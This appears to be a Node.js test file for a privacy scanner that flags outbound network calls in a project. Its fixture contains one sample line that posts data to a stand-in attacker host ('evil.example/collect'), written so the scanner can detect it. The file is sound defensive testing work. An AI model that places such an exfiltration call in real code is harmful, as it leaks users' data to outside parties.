// ===========================================================================
// bin/valu-privacy-scan.js — anyone can repeat the deterministic privacy scan.
// ===========================================================================
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const BIN = fileURLToPath(new URL('../../bin/valu-privacy-scan.js', import.meta.url));

function fixture() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'valu-privacy-scan-'));
  fs.mkdirSync(path.join(dir, 'src'));
  fs.mkdirSync(path.join(dir, 'node_modules', 'x'), { recursive: true });
  fs.mkdirSync(path.join(dir, 'dist', 'assets'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'src', 'app.ts'), "await fetch('https://evil.example/collect', { body });\n");
  fs.writeFileSync(path.join(dir, 'node_modules', 'x', 'index.js'), "fetch('https://ignored.example/')\n");
  fs.writeFileSync(path.join(dir, 'dist', 'index.html'), '<script type="module" src="/assets/a.js"></script>');
  fs.writeFileSync(path.join(dir, 'dist', 'assets', 'a.js'), 'fetch(e)');
  fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ dependencies: { react: '18' } }));
  return dir;
}

test('prints the scan of a folder as JSON', () => {
  const dir = fixture();
  try {
    const run = spawnSync(process.execPath, [BIN, dir, '--site-origin', 'https://a-b.valuguru.app'], { encoding: 'utf8' });
    assert.equal(run.status, 0, run.stderr);
    const result = JSON.parse(run.stdout);
    assert.equal(result.rulesVersion, '1');
    assert.deepEqual(
      result.findings.map((f) => [f.rule, f.file, f.line]),
      [['egress.external-url', 'src/app.ts', 1]],
      'node_modules is not source; a built fetch(e) is not a finding',
    );
    assert.deepEqual(result.inventory.deps, ['react']);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('refuses to run without a folder', () => {
  const run = spawnSync(process.execPath, [BIN], { encoding: 'utf8' });
  assert.equal(run.status, 2);
  assert.match(run.stderr, /usage/);
});
